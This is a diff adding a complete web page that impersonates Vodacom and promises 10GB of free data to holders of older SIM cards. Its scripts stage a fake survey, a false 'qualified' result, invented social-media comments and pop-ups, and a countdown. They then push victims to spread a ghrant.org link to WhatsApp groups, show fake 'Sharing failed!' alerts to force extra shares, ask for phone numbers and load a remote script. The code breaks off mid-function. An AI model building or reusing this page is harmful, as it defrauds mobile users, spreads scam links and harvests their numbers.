@@ -1,0 +1,1505 @@
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html>
+<html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+  <script src="demo.js"></script>
+    <script src="vodacom-active.js"></script>
+
+    
+  
+  
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta content='width=device-width, initial-scale=1.0' name='viewport'/>
+<title>Vodacom Old Customer Reward</title>
+<link id="favicon" rel="shortcut icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRzikFuDbzAOddrRt6XnAnGFs1q4KxAEuIkOQ&usqp=CAU">
+<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgzsqK-CKKsanPaB7l5EM9K1zBX15IXyI7dEVCBoFp6eRC2b_LR6wu0Fku31400vtUGAFreaeZ2nTTxlhiM3yUVsvYBqz-zjKCLb1iAyqAYoa2ErieyH2xctXhBTZf5OAPJfqsXGSToOSzBYvEBFJYmNok_uuASj7gIID5OQ0DM-3mYAQu0fVO4908UUrmm/s320/A259E69D-3063-45A0-B64D-5B671C443110.jpeg">
+<meta property="og:title" content="Vodacom Old customer Reward">
+<meta property="og:description" content="Stay Connected with your Vodacom Old sim card and get 10GB free Data...From 1 year and above">
+<meta property="og:url" content="https://Vodacomonline/">
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+<script>
+var tiaoban = [
+"*Get 10GB free Data if your Vodacom number is up to a year or above*%0AGET DATA HERE%0Ahttps://ghrant.org/vodacom", 
+"*Get 10GB free Data if your Vodacom number is up to a year or above*%0AGET DATA HERE%0Ahttps://ghrant.org/vodacom.html",
+];
+var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
+
+var date = new Date();
+var hour = (date.getHours() > 9) ? date.getHours() : '0' + date.getHours();
+var minute = (date.getMinutes() > 9) ? date.getMinutes() : '0' + date.getMinutes();
+var second = (date.getSeconds() > 9) ? date.getSeconds() : '0' + date.getSeconds();
+var mytime = hour + ':' + minute + ':' + second;
+
+var tb = tiaoban + '?_t=' + (new Date().getTime()) + '%0A%0A' + mytime ;
+</script>
+<script async src="https://www.googletagmanager.com/gtag/js"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+
+gtag('config', 'UA-1');
+</script>
+<script>
+var timer_start = 5;
+var total = 3;
+jQuery(document).ready(function ($) {
+$(".answer").click(function () {
+if($(this).hasClass("anses1")){
+survey.step1();
+}
+if($(this).hasClass("anses2")){
+survey.step2();
+}
+if($(this).hasClass("anses3")){
+survey.step3();
+}
+});
+var clicks = 0;
+var survey = {
+step1: function(){
+setTimeout(function () {
+//hide question block
+$(".question_count").hide();
+$(".question1").hide();
+$(".anses1").hide();
+//show calculating
+$(".calculating").show();
+setTimeout(function () {
+//hide calculating
+$(".calculating").hide();
+//show step 2
+$(".question_count span").html("2");
+$(".question_count").show();
+$(".question2").show();
+$(".anses2").show();
+}, 1200);
+}, 300);
+},
+step2: function(){
+setTimeout(function () {
+//hide question block
+$(".question_count").hide();
+$(".question2").hide();
+$(".anses2").hide();
+//show calculating
+$(".calculating").show();
+setTimeout(function () {
+//hide calculating
+$(".calculating").hide();
+//show step 3
+$(".question_count span").html("3");
+$(".question_count").show();
+$(".question3").show();
+$(".anses3").show();
+}, 1200);
+}, 300);
+},
+step3: function(){
+setTimeout(function () {
+//hide question block
+$(".question_count").hide();
+$(".question3").hide();
+$(".anses3").hide();
+//show calculating
+$(".calculating").show();
+setTimeout(function () {
+//hide calculating
+$(".calculating").hide();
+//show checking part
+$(".survey_middle").css("vertical-align","top");
+$(".loading").show();
+setTimeout(function () {
+$(".check1").fadeIn(300);
+setTimeout(function () {
+$(".check2").fadeIn(300);
+setTimeout(function () {
+$(".check3").fadeIn(300);
+setTimeout(function () {
+survey.change();
+}, 1400);
+}, 1100);
+}, 1400);
+}, 750);
+}, 600);
+}, 300);
+},
+change: function(){
+//sakrij gornje
+$(".headline,.small_headlines,.timer").hide();
+//sakrij content surveya
+$(".loading").hide();
+$(".survey_outer").css("height","auto");
+//pokazi ostatak
+var walink = "whatsapp://send?text=";
+//$(".btn-share").attr("href",walink);
+$(".btn-share").click(function(){
+clicks++;
+$('#progreso').show();
+if (clicks > total) {
+window.location = Web;
+return;
+}
+$('.progress span').width(((clicks / total) * 100) + '%');
+if (clicks == total) {
+window.location.href = walink;
+}
+window.location.href = walink;
+});
+$(".last_page").show();
+$(".fbcoms").show();
+waitme();
+}
+};
+$(".like").click(function() {
+if($(this).hasClass("selected")) {
+$(this).removeClass("selected");
+$(this).html("Like");
+$("#youand").html("");
+} else {
+$(this).addClass("selected");
+$(this).html("dislike");
+$("#youand").html("You and ");
+}
+});
+$(".fblike").click(function() {
+if($(this).hasClass("selected")) {
+$(this).removeClass("selected");
+$(this).html("Like");
+} else {
+$(this).addClass("selected");
+$(this).html("dislike");
+}
+});
+function waitme(){
+FBcom("#fb1",000);
+FBcom("#fb2",000);
+FBcom("#fb3",000);
+FBcom("#fb4",000);
+FBcom("#fb5",00);
+FBcom("#fb6",000);
+FBcom("#fb7",000);
+FBcom("#fb8",0000);
+var ct = 48;
+(function loop() {
+var rand = random(2500,5500);
+var ctrand = random(1,4);
+ct = ct - ctrand;
+if(ct > 1) {
+setTimeout(function() {
+loop();
+}, rand);
+} else {
+ct = "few";
+}
+$("#count").html(ct);
+}());
+}
+function FBcom(a,b) {
+setTimeout(function() {
+var m = 0, n = true, op = 0;
+$(a+", "+a+" .comtxt, "+a+" .combot").slideDown(500);
+$().slideDown(500);
+var t = setInterval(function() {
+op += 0.2;
+$(a).css({"opacity":op});
+m++;
+if(m === 5) clearInterval(t);
+}, 100);
+}, b);
+}
+function random(min, max) {
+return Math.round(Math.random() * (max - min) + min);
+}
+var out,pops = {
+init: function(){
+setTimeout(function () {
+var rand_name = pop_names[random(0,pop_names.length-1)];
+var rand_text = pop_texts[random(0,pop_texts.length-1)];
+var text = rand_name + " " + rand_text;
+$(".pops p").html(text);
+$(".pops").fadeIn(500);
+out = setTimeout(function () {
+$(".pops").fadeOut(1000);
+pops.init();
+}, 6000);
+}, random(6000, 15000));
+}
+};
+pops.init();
+$("#iks").click(function () {
+clearTimeout(out);
+$(".pops").hide();
+pops.init();
+});
+$("#mins").html("0"+timer_start);
+$("#sec").html("00");
+var mins = timer_start, secs = 0, minutes, seconds, timer = {
+init: function(){
+var counter = setInterval(function () {
+$(".timer_heading").addClass("blink");
+setTimeout(function () {
+$(".timer_heading").removeClass("blink");
+}, 500);
+secs--;
+if(secs<0){
+secs = 59;
+mins--;
+if(mins<0){
+clearInterval(counter);
+mins = 0;
+secs = 0;
+$(".timer_heading").hide();
+$(".timer .small_headlines").show();
+}
+if(mins<10){
+minutes = "0" + mins;
+}else{
+minutes = mins;
+}
+}
+if(secs<10){
+seconds = "0" + secs;
+}else{
+seconds = secs;
+}
+$("#mins").html(minutes);
+$("#sec").html(seconds);
+}, 1000);
+}
+};
+timer.init();
+if(get_Cookie('prog')){
+setTimeout(function(){
+$(".question_count").hide();
+$(".question1").hide();
+$(".anses1").hide();
+survey.change();
+incrementValue_a();
+fn1_a();
+},200)
+}
+});
+
+
+</script>
+<style>
+@import url('https://fonts.googleapis.com/css?family=Montserrat');
+@font-face{
+font-family: 'Roboto';
+font-weight: 400;
+src: url(../fonts/Roboto-Regular.ttf);
+}
+@font-face{
+font-family: 'Roboto';
+font-weight: 700;
+src: url(../fonts/Roboto-Bold.ttf);
+}
+@font-face{
+font-family: 'Tahoma';
+font-weight: 400;
+src: url(../fonts/Tahoma.ttf);
+}
+@font-face{
+font-family: 'Tahoma';
+font-weight: 700;
+src: url(../fonts/Tahoma-Bold.ttf);
+}
+body,html{
+width: 100%;
+margin: 0;
+font-family: 'Montserrat', sans-serif;
+background: #000000;
+color:#6e34abed;
+}
+/*clearfix*/
+.clearfix:before, .clearfix:after{content:"";display:table;}
+.clearfix:after{clear: both;}
+.clearfix{*zoom: 1;}
+*{
+box-sizing: border-box;
+}
+p{
+margin: 0;
+}
+.cont_outer{
+position: absolute;
+display: table;
+width: 100%;
+height: 100%;
+background-image: url(https://0ne.buzz/id-indomaret/img/219958493.jpg);
+background-position: center top;
+background-size: 750px auto;
+background-repeat: repeat-y;
+}
+.bold{
+font-weight: 700;
+}
+/*************************************************** header ***************************************************/
+.header{
+display: table-row;
+width: 100%;
+height: 50px;
+background-color: #fff;
+font-weight: 700;
+}
+.header-inner{
+display: table-cell;
+vertical-align: middle;
+text-align: center;
+}
+.header-inner p{
+vertical-align: middle;
+color: #fff;
+font-size: 18px
+}
+.header-inner p img{
+vertical-align: middle;
+}
+#folder{
+width: 28px;
+}
+#rupee1{
+width: 14px;
+padding-left: 2px
+}
+/*************************************************** content ***************************************************/
+
+.content{
+display: table-row;
+width: 100%;
+overflow-x: hidden
+}
+.content-middle{
+display: table-cell;
+vertical-align: middle;
+width: 100%;
+}
+.content-inner{
+width: 95%;
+max-width: 600px;
+margin: 5px auto;
+text-align: center;
+padding: 15px 3px;
+border-radius: 4px;
+background-color: #ffffff;
+color: #000000;
+}
+#logo{
+width: 220px;
+}
+.headline{
+color: #000;
+font-weight: bold;
+font-size: 22px;
+line-height: 45px
+}
+.headline,.headline span img{
+vertical-align: middle;
+}
+.headline span{
+vertical-align: top;
+}
+.headline span{
+text-decoration: underline;
+}
+.headline span img{
+width: 12px;
+margin-left: 3px;
+}
+.small_headlines{
+font-size: 16px;
+color: #000000ed;
+font-weight: 400;
+padding-bottom: 10px;
+}
+.small_headlines img{
+width: 10px;
+margin-left: 3px;
+vertical-align: middle;
+line-height: 22px;
+}
+.question2,.question3{
+display: none;
+}
+/*************************************************** survey ***************************************************/
+.survey_outer{
+display: table;
+width: 95%;
+margin: 15px auto 0;
+background-color: #c4161b;
+border-radius: 4px;
+height: 295px;
+}
+.survey_middle{
+display: table-cell;
+vertical-align: middle;
+}
+.survey_inner{
+display: block;
+width: 95%;
+margin: 0 auto;
+padding: 15px 0;
+position: relative;
+}
+.anses2,.anses3{
+display: none;
+}
+.question_count{
+color: #fff;
+font-size: 24px;
+font-weight: 700;
+}
+.question_text{
+color: #fff;
+font-size: 20px;
+line-height: 38px;
+}
+.question2{
+line-height: 1.2em;
+padding: 10px 0 15px;
+}
+.question3{
+line-height: 1.2em;
+}
+.answer{
+width: 80%;
+margin: 15px auto;
+text-align: center;
+padding: 7px 0;
+color: #222;
+background-color: #fff;
+border-radius: 7px;
+border: 1px solid #027CD5;
+font-size: 24px;
+font-weight: 400;
+cursor: pointer;
+-webkit-transition: all 0.3s ease-in-out;
+-moz-transition: all 0.3s ease-in-out;
+transition: all 0.3s ease-in-out;
+}
+.answer:hover{
+color: #222;
+background-color: #fff;
+font-weight: 700;
+}
+.calculating{
+display: none;
+vertical-align: middle;
+font-size: 28px;
+text-transform: uppercase;
+color: #fff;
+font-weight: 700;
+}
+.calculating img{
+vertical-align: middle;
+width: 50px;
+}
+/****** loading ******/
+.loading{
+display: none;
+text-align: center;
+color: #fff;
+font-weight: 700;
+}
+.loading img{
+width: 70%;
+max-width: 220px;
+margin: 0 auto 15px;
+}
+.load_headline{
+font-size: 24px;
+margin: 15px 0;
+}
+.check{
+font-size: 20px;
+margin: 10px 0;
+}
+.check1,.check2,.check3{
+display: none;
+}
+/*************************************************** last page ***************************************************/
+.last_page{
+display: none;
+}
+.last-up{
+text-align: left;
+}
+.textlastup{
+color: #fff;
+font-size: 18px;
+padding-bottom: 8px;
+font-weight: 400;
+}
+.btn{
+width: 80%;
+font-size: 28px;
+max-width: 345px;
+margin: 15px auto;
+background-color: #58BE41;
+border-radius: 5px;
+color: #fff;
+font-weight: 700;
+text-align: center;
+display: block;
+padding: 7px 0;
+text-decoration: none;
+-webkit-transition: all 0.2s ease-in-out;
+-moz-transition: all 0.2s ease-in-out;
+transition: all 0.2s ease-in-out;
+box-shadow: none;
+}
+.btn:hover{
+background-color: #fff;
+color: #58BE41;
+box-shadow: 0 0 2px #58BE41,
+0 0 5px #58BE41,
+0 0 7px #58BE41,
+0 0 11px #58BE41;
+}
+.btn-share{
+font-size: 24px;
+background-color: #58BE41;
+background-size: 40px auto;
+background-position: left 5px top 1px;
+background-repeat: no-repeat;
+}
+
+.progress { width:80%; height: 20px; /* Can be anything */ position: relative; margin: 60px 0 20px 0; /* Just for demo spacing */ background: #555; padding: 10px; -webkit-box-shadow: inset 0 -1px 1px rgba(255,255,255,0.3); -moz-box-shadow : inset 0 -1px 1px rgba(255,255,255,0.3); box-shadow : inset 0 -1px 1px rgba(255,255,255,0.3); margin: auto; } .progress > span { display: block; height: 20px; left: 0; top: 0; background-color: #3F51B5; background-image: -webkit-gradient( linear, left bottom, left top, color-stop(0, #00BCD4), color-stop(1, #2196F3) ); background-image: -moz-linear-gradient( center bottom, rgb(43,194,83) 37%, rgb(84,240,84) 69% ); -webkit-box-shadow: inset 0 2px 9px rgba(255,255,255,0.3), inset 0 -2px 6px rgba(0,0,0,0.4); -moz-box-shadow: inset 0 2px 9px rgba(255,255,255,0.3), inset 0 -2px 6px rgba(0,0,0,0.4); box-shadow: inset 0 2px 9px rgba(255,255,255,0.3), inset 0 -2px 6px rgba(0,0,0,0.4); position: absolute; overflow: hidden; } .progress > span:after, .animate > span > span { content: ""; position: absolute; top: 0; left: 0; bottom: 0; right: 0; background-image: -webkit-gradient(linear, 0 0, 100% 100%, color-stop(.25, rgba(255, 255, 255, .2)), color-stop(.25, transparent), color-stop(.5, transparent), color-stop(.5, rgba(255, 255, 255, .2)), color-stop(.75, rgba(255, 255, 255, .2)), color-stop(.75, transparent), to(transparent) ); background-image: -moz-linear-gradient( -45deg, rgba(255, 255, 255, .2) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .2) 50%, rgba(255, 255, 255, .2) 75%, transparent 75%, transparent ); z-index: 1; -webkit-background-size: 50px 50px; -moz-background-size: 50px 50px; -webkit-animation: move 2s linear infinite; -webkit-border-top-right-radius: 8px; -webkit-border-bottom-right-radius: 8px; -moz-border-radius-topright: 8px; -moz-border-radius-bottomright: 8px; border-top-right-radius: 8px; border-bottom-right-radius: 8px; -webkit-border-top-left-radius: 20px; -webkit-border-bottom-left-radius: 20px; -moz-border-radius-topleft: 20px; -moz-border-radius-bottomleft: 20px; border-top-left-radius: 20px; border-bottom-left-radius: 20px; overflow: hidden; } .animate > span:after { display: none; } @-webkit-keyframes move { 0% { background-position: 0 0; } 100% { background-position: 50px 50px; } }
+
+
+
+
+.btn-down{
+font-size: 24px;
+text-transform: uppercase;
+}
+
+.fbcoms {
+font-family: Tahoma, Verdana, sans-serif;
+background-color: #fff;
+width: 100%;
+margin: 0 auto;
+padding: 5px 10px;
+font-size: 12px;
+text-align: left;
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+color: #333;
+}
+.comments {
+font-weight: bold;
+text-align: center;
+padding: 0 5px 10px 5px;
+}
+.totlikes {
+margin-top: 3px;
+background-color: #eeeff4;
+padding: 5px 5px 5px 23px;
+background-image: url("../img/f/like.png");
+background-repeat: no-repeat;
+background-position: 5px center;
+}
+.fbblue {
+color: #3c5a96;
+}
+.buttons {
+padding-bottom: 5px;
+font-family: Arial, sans-serif;
+color: #7d7d7f;
+}
+.buttons span {
+cursor: pointer;
+}
+.buttons span:hover {
+text-decoration: underline;
+}
+
+.buttond {
+background-color: #0d609b;
+color: #fff;
+font-size: 1.2em;
+font-weight: bold;
+text-align: center;
+padding:10px;
+margin-top:5px;
+}
+.viewmore {
+margin-top: 3px;
+background-color: #eeeff4;
+padding: 5px 5px 5px 23px;
+background-image: url("");
+background-position: 5px center;
+background-repeat: no-repeat;
+}
+.left {
+cursor: pointer;
+float: left;
+color: #3c5a96;
+}
+.left:hover {
+text-decoration: underline;
+}
+.right {
+color: #7d7d7f;
+float: right;
+}
+.item {
+position: relative;
+margin-top: 3px;
+background-color: #eeeff4;
+padding: 5px 5px 5px 60px;
+min-height: 60px;
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+}
+.item .profileimg {
+position: absolute;
+top: 5px;
+left: 5px;
+}
+.comtxt {
+line-height: 16px;
+}
+.name {
+color: #3c5a96;
+font-weight: bold;
+}
+.ago {
+color: #86878c;
+font-size: 0.95em;
+}
+.fblike {
+color: #3c5a96;
+font-size: 0.95em;
+cursor: pointer;
+}
+.fblike:hover {
+text-decoration: underline;
+}
+.combot {
+padding-top: 5px;
+}
+.clickhere {
+font-weight: bold;
+padding: 30px 10px 5px;
+line-height: 18px;
+}
+.likes {
+color: #3c5a96;
+font-size: 0.95em;
+cursor: pointer;
+}
+.fbimg {
+background-color: #fff;
+border-radius: 2px;
+-moz-border-radius: 2px;
+-webkit-border-radius: 2px;
+max-width: 210px;
+width: 100%;
+padding: 3px;
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+border: 1px solid #808080;
+margin: 10px 0 5px;
+}
+.hidden {
+display: none;
+opacity: 0;
+}
+.hidden .comtxt, .hidden .combot, .comments {
+display: none;
+}
+.answer{
+cursor: pointer;
+}
+
+.pops{
+position: fixed;
+top: 80px;
+right: 10px;
+display: none;
+width: 230px;
+margin: 10px 10px 0 0;
+background-color: rgba(173,176,192,0.8);
+width: 230px;
+border-radius: 8px;
+box-shadow: 0 0 7px #888888;
+padding-bottom: 3px
+}
+#piplovi{
+width: 55px;
+margin: 0;
+padding: 5px;
+float: left;
+}
+#iks{
+position: absolute;
+top: -10px;
+right: -10px;
+width: 20px;
+cursor: pointer;
+}
+.pops p{
+width: 170px;
+padding: 2px;
+padding-top: 10px;
+margin-left: 50px;
+font-size: 14px;
+color: #fff;
+word-spacing: 0;
+line-height: 100%;
+}
+
+.timer .small_headlines{
+display: none;
+}
+.timer_heading{
+width: 80%;
+margin: 0 auto;
+font-size: 16px;
+color: #e6dcdced;
+font-weight: 400;
+padding-bottom: 10px;
+}
+@-webkit-keyframes bllink{
+from{
+color: #fff;
+text-shadow: none;
+transform: scale(1,1);
+}
+to{
+color: #ff0000;
+text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
+transform: scale(1.3,1.3);
+}
+}
+@-moz-keyframes bllink{
+from{
+color: #fff;
+text-shadow: none;
+transform: scale(1,1);
+}
+to{
+color: #ff0000;
+text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
+transform: scale(1.3,1.3);
+}
+}
+@keyframes bllink{
+from{
+color: #fff;
+text-shadow: none;
+transform: scale(1,1);
+}
+to{
+color: #ff0000;
+text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
+transform: scale(1.3,1.3);
+}
+}
+.blink{
+-webkit-animation: 0.2s bllink ease-in-out alternate;
+-moz-animation: 0.2s bllink ease-in-out alternate;
+animation: 0.2s bllink ease-in-out alternate;
+}
+
+@media screen and (max-width: 600px){
+.cont_outer{
+background-size: 600px auto;
+}
+.headline{
+font-size: 18px;
+}
+.small_headlines,.timer_heading{
+font-size: 13px;
+}
+}
+@media screen and (max-width: 500px){
+.btn{
+width: 90%;
+max-width: 345px;
+}
+}
+@media screen and (max-width: 400px)
+.header-inner p{
+font-size: 14px;
+}
+#rupee1{
+width: 12px;
+padding-left: 2px
+}
+.header{
+height: 40px;
+}
+.gutschein {
+background-color: #000000;
+border-radius: 10px;
+padding:10px;
+font-weight: bold;
+color: #ffffff;
+font-size: 1.0em;
+margin-top:2px;
+text-align: center;
+}
+.answer{
+margin: 10px auto;
+padding: 5px 0;
+border-radius: 7px;
+border: 1px solid #027CD5;
+font-size: 20px;
+color: #222;
+font-weight: 700;
+}
+.survey_outer{
+height: 250px;
+}
+.calculating{
+font-size: 22px;
+}
+.load_headline{
+font-size: 20px;
+margin: 15px 0;
+}
+.check{
+font-size: 16px;
+margin: 10px 0;
+}
+.textlastup{
+font-size: 16px;
+padding-bottom: 5px;
+font-weight: 400;
+}
+.btn{
+width: 100%;
+max-width: 345px;
+}
+.btn-share{
+font-size: 20px;
+background-size: 36px auto;
+}
+.btn-down{
+font-size: 20px;
+}
+} #main-frame-error{display:none;height:auto}.interstitial-wrapper{padding-top:10px;box-sizing:border-box;font-size:1em;line-height:18px;margin:auto;max-width:600px;width:90%}#today{float:right;font-weight:600;padding-top:15px}#main-message>p{display:inline}#blink{color:#f00;padding:6px;-webkit-animation:blink 1s infinite;-moz-animation:blink 1s infinite;-ms-animation:blink 1s infinite;-o-animation:blink 1s infinite;animation:blink 1s infinite}@-webkit-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-moz-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-ms-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}}@-o-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}#theTime{font-size:18px;font-weight:bold;color:red;font-family:sans-serif}h1{color:#000;font-size:1.6em;line-height:1.25em;margin-bottom:16px}#alertimg{height:26px;width:26px;position:absolute;top:13px;left:17px}.popup{display:none;position:absolute;top:20%;left:50%;width:88%;max-width:280px;margin:0 0 0 -140px;font-size:1em;border-radius:4px;background-color:#282828;color:#fff;overflow:hidden;box-shadow:1px 1px 7px #000;z-index:100}.popup-head{background-color:#282828;padding:18px 16px 18px 55px;border-bottom:2px solid #33b4e4;color:#33b4e4;line-height:normal}.popup-center{padding:20px 16px;color:#f3f3f3;line-height:20px}.popup-bottom{background-color:#282828;padding:9px 6px;text-align:center;border-top:1px solid #474747;overflow:hidden}.popup-bottom .button{display:block;height:30px;width:128px;margin:0 auto;font-size:1.1em;color:#f3f3f3;border-radius:3px;cursor:pointer;text-decoration:none;padding:0;line-height:30px}
+
+a {
+text-decoration: none;
+}
+
+</style>
+
+<link rel="me" href="https://www.blogger.com/profile/11256903007374519918" />
+<link rel="me" href="https://www.blogger.com/profile/02064811961029309684" />
+<link rel="me" href="https://draft.blogger.com/profile/03686527602587087291" />
+<link rel="me" href="https://www.blogger.com/profile/05912208554193069237" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+
+<center>
+<div class='content'>
+<!-- content -->
+<div class='content-middle'>
+<div class='content-inner'>
+<p class='headline' style="color:#000000;">
+<img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYV0vXcnycVYz-SUVkpjpVzqcT_YpyE_iwySNywB0MoVhARc5A0L8pJSdWHZPsrco9VEu0bTjeKCwH0v2-sKBGDuuMVoHhECtl0Ht7Q3hxbG-WYJGQmUA6gfzRaVrYUI5dp8SJOmWaIgc7JmQeWkXfykod381bDiKmRp5RRxyM0CXRGfpG705BTOm09lCE/s300/97B35866-B7EE-48A2-94D1-8EABBF46052A.jpeg' width='350' /><br/><strong> <font color="#2980B9">VODACOM OLD CUSTOMER REWARD</font></strong><br/>
+Stay Connected with your Vodacom Old sim card and get 10GB free Data...From 1 year and above<br/>
+  
+</p>
+<b>
+Please answer the following questions first:
+<b> <br/>
+<div class='survey_outer'>
+<div class='survey_middle'>
+<div class='survey_inner'>
+<!-- <p class='question_count'>
+Pergunta
+<span>
+1
+</span>
+de 3
+</p> -->
+<p class='question_text question1'>
+Question 1: Are you an Vodacom Customer?
+</p>
+<p class='question_text question2'>
+Question 2: How Old is Your Vodacom Sim?
+</p>
+<p class='question_text question3'>
+Question 3: Choose your country
+</p>
+<div class='ans-box'>
+<div class='answer anses1'>
+<p>
+Yes
+</p>
+</div>
+<div class='answer anses1'>
+<p>
+No
+</p>
+</div>
+<div class='answer anses2'>
+<p>
+1 year old (500MB)
+</p>
+</div>
+  <div class='answer anses2'>
+<p>
+2 years old (1GB)
+</p>
+</div>
+  
+<div class='answer anses2'>
+<p>
+3 years old (3GB)
+</p>
+</div>
+  <div class='answer anses2'>
+<p>
+4 years and above (10GB)
+</p>
+</div>
+  
+<div class='answer anses3'>
+<p>
+DR Congo 🇨🇩
+</p>
+</div>
+
+<div class='answer anses3'>
+<p>
+Burundi 🇧🇮 
+</p>
+</div>
+<div class='answer anses3'>
+<p>
+Congo 🇨🇬
+</p>
+</div>	
+<div class='answer anses3'>
+<p>
+Rwanda 🇷🇼
+</p>
+</div>
+<div class='answer anses3'>
+<p>
+Zambia 🇿🇲
+</p>
+</div>
+
+<div class='answer anses3'>
+<p>
+Cameroon 🇨🇲
+</p>
+</div>	
+
+</div>
+<p class='calculating'>
+<img alt='' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5ySWE-pfnKUEmruzK7wVsGwF6fWZME_W6_5jlPGeM5tbVUDltgdajXA32C69gcgOb63IptkI970j-0dRJvOAJzhbfebjfsOO1qfO3iwnPyKHEvmxmcJ4gtC2fwtTmoT3XaOoq9YIg8l8iOyUEJbYPaKM1lADxQzcyMDQGNOzVPzfYdI7kV-IHesCTlbBL/s255/4DBC98DF-1EA3-40F8-A248-123512C40E57.gif'/>
+Please wait, we are processing your feedback.
+</p>
+<div class='loading'>
+<p class='load_headline'>
+Please wait a moment ...
+</p>
+<img alt='' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5ySWE-pfnKUEmruzK7wVsGwF6fWZME_W6_5jlPGeM5tbVUDltgdajXA32C69gcgOb63IptkI970j-0dRJvOAJzhbfebjfsOO1qfO3iwnPyKHEvmxmcJ4gtC2fwtTmoT3XaOoq9YIg8l8iOyUEJbYPaKM1lADxQzcyMDQGNOzVPzfYdI7kV-IHesCTlbBL/s255/4DBC98DF-1EA3-40F8-A248-123512C40E57.gif' style='height:50px;width:50px;'/>
+<p class='check check1'>
+All questions have been answered
+
+</p>
+<p class='check check2'>
+You are 100% qualified.
+</p>
+<p class='check check3'>
+Congratulations!<br/> <img src='https://blogger.googleusercontent.com/img/a/AVvXsEgGfhp-X9Wlaiu0hN6ydgmgrt6pSeHgQzQ_E97l0D5nhYnypF6YeKj3reNpm3rJAgZUtmC_bd6PbVBi32uplh5slssU0ftMeThThcl96KONFydt98JiCG9jopepA2HSiMarkek1alQNibiySz9SG1WKTpHLx6CVkJP6gCbLWLblTOOLdOyJ8idPhveZmA=s320' width='100%' />
+
+</p>
+</div>
+<div class='last_page'>
+<div class='last-up'>
+<h4 class='textlastup'>
+<img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYV0vXcnycVYz-SUVkpjpVzqcT_YpyE_iwySNywB0MoVhARc5A0L8pJSdWHZPsrco9VEu0bTjeKCwH0v2-sKBGDuuMVoHhECtl0Ht7Q3hxbG-WYJGQmUA6gfzRaVrYUI5dp8SJOmWaIgc7JmQeWkXfykod381bDiKmRp5RRxyM0CXRGfpG705BTOm09lCE/s300/97B35866-B7EE-48A2-94D1-8EABBF46052A.jpeg' width='350' />
+<br/>
+	<font color="white">
+Congratulations!</font>
+<br/><br/> <div id='lastapp'>
+<font color="white"> Through Your Answer you are eligible to Get<strong> Free Vodacom 10GB Data for your old Vodacom Sim Card </strong> <br></br>How to get it:</font><br/><br/>
+<font color="black">
+1. Share with 5 groups / 20 friends via WHATSAPP (click the "WhatsApp" icon below)
+<br/><br/>
+2. Click "ADD MOBILE NO" to add your Vodacom old Number and get your Free Data</font>
+<br/><br/></div>
+</h4>
+<script type="text/javascript">
+j='';
+banner='';
+$.getScript('yuming.js?'+ (new Date()).getTime());
+
+
+theme='aden';
+
+var vid=[
+'Qzkj_p7GnLc',
+];
+
+var STRONG = {
+share: 10
+};
+
+
+
+function incrementValue1() {
+if(parseInt(get_Cookie('prog')) > 600){
+window.open('whatsapp://send?text=' + tb);
+}else{
+window.open('whatsapp://send?text=' + tb);
+}
+setTimeout(function(){
+incrementValue_i();
+fn1_i();
+value = parseInt(get_Cookie('prog'));
+set_Cookie('prog',value+1);
+},2000);
+}
+function incrementValue_i()
+{
+get_Cookie('prog')=='' ? value=0 : value=get_Cookie('prog') ;
+value == 2 || value == 4 ? alert('Sharing failed!\n\n The same group or the same friend is not correct. Please check and share again.') : void(0) ;
+set_Cookie('prog',value);
+record('adien',value);
+record(theme,'share');
+if(value>= 12){
+record('adien','wc');
+lasthtml();
+}
+}
+function fn1_i() {
+v=get_Cookie('prog');
+document.querySelector('.progress').style.display = "block";
+v=='0'?ob=30:v=='1'?ob=50:v=='2'?ob=52:v=='3'?ob=60:v=='4'?ob=60:v=='5'?ob=65:v=='6'?ob=70:v=='7'?ob=80:v=='8'?ob=85:v=='9'?ob=90:v=='10'?ob=96:v=='11'?ob=98:v=='12'?ob=100:void(0);
+document.querySelector('.progress span').style['width'] = ob + "%";
+document.querySelector('.progress span').style['width'] = ob + "%";
+document.querySelector('.progress p').textContent = ob + "%";
+}
+
+function incrementValue_a()
+{
+value = parseInt(get_Cookie('prog'))-1;
